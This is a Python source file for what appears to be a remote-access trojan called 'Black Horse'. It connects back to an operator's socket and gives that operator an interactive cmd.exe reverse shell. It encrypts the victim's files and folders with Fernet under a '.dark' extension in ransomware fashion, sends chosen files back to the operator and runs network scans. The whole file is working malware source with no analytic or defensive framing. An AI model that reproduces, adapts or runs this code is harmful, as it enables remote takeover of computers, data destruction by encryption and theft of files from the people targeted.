from cmd import Cmd
import threading
import sys
import subprocess
import socket
from time import sleep
from cryptography.fernet import Fernet
import os

try:
    import scanig
except ImportError:
    scanig = None

HOST = '127.0.0.1'
PORT = 65449

dirc = ""

def forward_output(proc):
    while True:        
        line = proc.stdout.readline()
        if not line:
            break
        send(line)

def send(msg):
    s.sendall((msg + "__END__").encode())

def set_up_sock():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    send("Black Horse with you now")

def recv():
    data = ""
    while "__END__" not in data:
        chunk = s.recv(1024)
        if not chunk:
            os._exit(0)
        data += chunk.decode()
    return data.replace("__END__", "")


def cmd_interactive():
    global procc , dirc

    procc = subprocess.Popen(
        ["cmd.exe"],
        cwd= dirc,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=0
    )


    send(f"Black Horse : Mode activated ")

    threading.Thread(
        target=forward_output,
        args=(procc,),
        daemon=True
        ).start()
    
    while True:
        cmd = recv()
        if cmd.lower() == "exit":
            dirc = get_current_dir_cmd()
            send("EXIT")
            if procc.poll() is None:
                procc.kill()
            break
        try:                        
            procc.stdin.write(cmd + "\n")
            procc.stdin.flush()
        except (BrokenPipeError, OSError):
            send("Shell closed")
            break

def get_current_dir_cmd():
    procc.stdin.write("cd \n")    
    procc.stdin.flush()

    return procc.stdout.readline().strip()



def encrypt_file(file_path, key):
    fernet = Fernet(key)    
    with open(file_path, "rb") as file:
        print(f"file :{file}")
        data = file.read()
    print(f"data :{data}")

    encrypted = fernet.encrypt(data)

    print(encrypted)
    with open(file_path, "wb") as file:
        file.write(encrypted)
    new_path = file_path + ".dark"
    os.replace(file_path, new_path)
    
def encrypt_folder(folder_path , key):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".dark"):
                continue        
            full_path = os.path.join(root, file)            
            try:
                encrypt_file(full_path, key)            
            except Exception as e:
                pass 

def enc_folder():
    path = recv()
    send(f"done path is {path}")
    key = recv()
    send(f"done key is {key}")
    sure = recv()
    if sure == "n":
        send("cancel")
        return        
    elif sure == "y":
        send("working")
        encrypt_folder(path, key)
        send("done")
        return
    else:
        send("bad confirm")
        return

def enc_file():
    path = recv()
    send(f"done file is {path}")
    key = recv()
    send(f"done key is {key}")
    sure = recv()
    if sure == "n":
        send("cancel")
        return

    elif sure == "y":
        send("working")
        try:
            encrypt_file(path, key)
            send("done")
        except Exception:
            pass
        send("done")
        return
    else:
        send("bad confirm")
        return

def send_file():    
    pr = subprocess.run(
        ["cmd.exe", "/c", "dir"],
        cwd= dirc,        
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=0
    )
    send(pr.stdout)    
    file = recv()
    if file.lower() == "exit":
        return
    try:
        with open(f"{dirc}\\{file}", "rb") as f:
            data = f.read()
        send(data.decode("latin-1"))
    except Exception:
        send("")
        

def scaning():
    if scanig is None:
        send("scan module not available")
        return
    send("scaning start...")    
    for result in scanig.scan():
        if not result:
            continue        
        ip, ports = result
        send(f"[+] IP: {ip}")
        for port, service in ports:
            send(f"    Port {port} → {service}")
            send("\n")
    sleep(1)
    send("done")
    return

def auto_action():    
    send(f"\n\nAuto mode active in {dirc}")
    while True :
        action = recv()
        if action =="1":
            enc_folder()

        elif action =="2":
            enc_file()

        elif action =="3":
            send_file()

        elif action =="4":
            scaning()

        elif action =="5":
            break
        else:
            continue

def shell():
    global dirc
    if not dirc:
        dirc = os.getcwd()
    while True:
        action=recv()
        if action == "1":
            cmd_interactive()
        elif action == "2":
            auto_action()
        elif action == "3":
            exit(0)
        else:           
           continue


def main():
    set_up_sock()
    shell()

if __name__ == "__main__":
    main()